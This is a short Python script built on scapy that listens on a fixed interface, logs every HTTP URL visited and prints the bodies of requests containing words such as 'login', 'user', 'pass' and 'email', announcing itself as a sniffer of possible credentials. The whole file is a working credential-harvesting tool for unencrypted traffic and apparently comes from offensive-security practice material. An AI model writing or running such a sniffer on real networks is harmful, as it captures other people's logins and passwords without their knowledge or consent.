#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import sys
import signal
from termcolor import colored


def def_handler(sig, frame):

    print(colored("\n[!] Exiting...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def process_packet(packet):

    post_keywords = ["login", "user", "pass", "name", "email"]

    if packet.haslayer(http.HTTPRequest):

        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"  [i] Visited -> {url}", "grey"))
        
        if packet.haslayer(scapy.Raw):
            response = packet[scapy.Raw].load.decode()
            try:
                for keyword in post_keywords:
                    if keyword in response:
                        print(colored(f"\n  [+] POST: {url} -> {response}\n", "green"))
                        break
            except:
                pass


def sniff(interface):

    scapy.sniff(iface=interface, prn=process_packet, store=0)


def main():

    print("\n[*] Sniffing HTTP possible credentials...\n")
    sniff("ens33")


if __name__ == "__main__":
    main()
